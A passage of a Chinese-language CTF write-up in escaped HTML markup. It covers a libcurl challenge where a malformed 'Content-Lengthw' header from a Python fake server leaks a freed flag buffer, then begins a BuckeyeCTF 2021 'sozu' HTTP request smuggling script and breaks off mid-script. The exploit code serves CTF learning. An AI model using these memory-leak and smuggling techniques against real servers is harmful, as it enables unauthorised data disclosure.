&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">size_t&lt;/span> &lt;span style="color:#111">content_length&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">atol&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">strtok&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">NULL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span>&lt;span style="color:#111">));&lt;/span> &lt;span style="color:#75715e">// 注意 依据CL值分配缓冲区的大小
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span> &lt;span style="color:#75715e">// 如果有先释放
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">free&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response_buf_size&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">content_length&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">malloc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response_buf_size&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">// 分配响应缓冲区大小为CL+1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">real_size&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">size_t&lt;/span> &lt;span style="color:#75af00">write_callback&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">size_t&lt;/span> &lt;span style="color:#111">size&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">size_t&lt;/span> &lt;span style="color:#111">nitems&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">userdata&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">size_t&lt;/span> &lt;span style="color:#111">real_size&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">size&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">nitems&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response_size&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">real_size&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">response_buf_size&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response_buf_size&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">response_size&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">real_size&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">char&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#111">realloc&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">response_buf_size&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">memcpy&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">response_size&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">real_size&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response_size&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">real_size&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">real_size&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setbuf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">stdin&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">NULL&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setbuf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">stdout&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">NULL&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setbuf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">stderr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">NULL&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">char&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">64&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">printf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Enter a URL and I&amp;#39;ll curl it: &amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">fgets&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">64&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">stdin&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">strcspn&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">verify_flag_file&lt;/span>&lt;span style="color:#111">())&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">fprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">stderr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;ERROR! flag.txt may have been tampered with!&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">CURL&lt;/span>&lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">curl_easy_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">curl&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">curl_easy_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CURLOPT_URL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">curl_easy_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CURLOPT_FOLLOWLOCATION&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">1L&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">curl_easy_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CURLOPT_HEADERFUNCTION&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">header_callback&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">curl_easy_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CURLOPT_WRITEFUNCTION&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">write_callback&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">curl_easy_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CURLOPT_PROTOCOLS&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">CURLPROTO_HTTP&lt;/span> &lt;span style="color:#f92672">|&lt;/span> &lt;span style="color:#111">CURLPROTO_HTTPS&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">CURLcode&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">curl_easy_perform&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">CURLE_OK&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">response&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">response_buf_size&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">puts&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">free&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">response&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">fprintf&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">stderr&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;curl_easy_perform() failed: %s&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">curl_easy_strerror&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">curl_easy_cleanup&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意header_callback检查CL头的时候用strstr函数，意味着我们可以用&lt;code>Content-Lengthw: 1023&lt;/code>这样的头来给response分配1023+1=1024的空间&lt;/p>
&lt;p>理论上来说，malloc应该在verify_flag_file的地方及时地释放掉含有flag的部分并且正确给出response，但是根据&lt;a href="https://curl.se/libcurl/c/CURLOPT_WRITEFUNCTION.html">doc - the curl docs for the write callback&lt;/a>，传入的数据并没有空字符作为终止符，而题目puts(response)的内容会到response_buf的末尾，也就是1024大小&lt;/p>
&lt;p>最后，response中前16字节是空字节，我们需要在发送16字符让它们变为非空&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">socket&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">AF_INET&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">SOCK_STREAM&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">bind&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">6969&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">listen&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">addr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">accept&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;Accepted connection.&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">with&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">while&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">endswith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\r\n\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">recv&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">conn&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">sendall&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;HTTP/1.1 200 OK&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;Content-Lengthw: 1023&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;a&amp;#39;&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">16&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">close&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>严格来说这并不是smuggling的问题，最多是涉及到TE&lt;/p>
&lt;p>There was a use after free on the buffer the flag was stored in. If you could get the binary to re-allocate another 1024-length buffer and not fill it in, it will contain the flag that was originally read into the &amp;ldquo;flag validity checking&amp;rdquo; buffer.&lt;/p>
&lt;p>虽然还是有一点点不太懂&lt;/p>
&lt;h4 id="buckeyectf-2021sozu">[BuckeyeCTF 2021]sozu&lt;/h4>
&lt;p>这下是正经的smuggling问题了&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">pwn&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">ssl&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">hostname&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;sozu.chall.pwnoh.io&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ssl&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">create_default_context&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#ctx.check_hostname = False&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#ctx.verify_mode = ssl.CERT_NONE&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">sock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">socket&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">create_connection&lt;/span>&lt;span style="color:#111">((&lt;/span>&lt;span style="color:#111">hostname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#ae81ff">13380&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">ssock&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">wrap_socket&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">server_hostname&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">hostname&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">remote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">hostname&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;13380&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">sock&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">ssock&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># The solution here is the tab after &amp;#39;chunked&amp;#39;.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># sozu will use content-length, gunicorn will use&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># chunked.&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># You do actually need another request after getting&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># the flag, otherwise you won&amp;#39;t get the response back&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#r = remote(&amp;#34;localhost&amp;#34;, &amp;#34;3000&amp;#34;)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
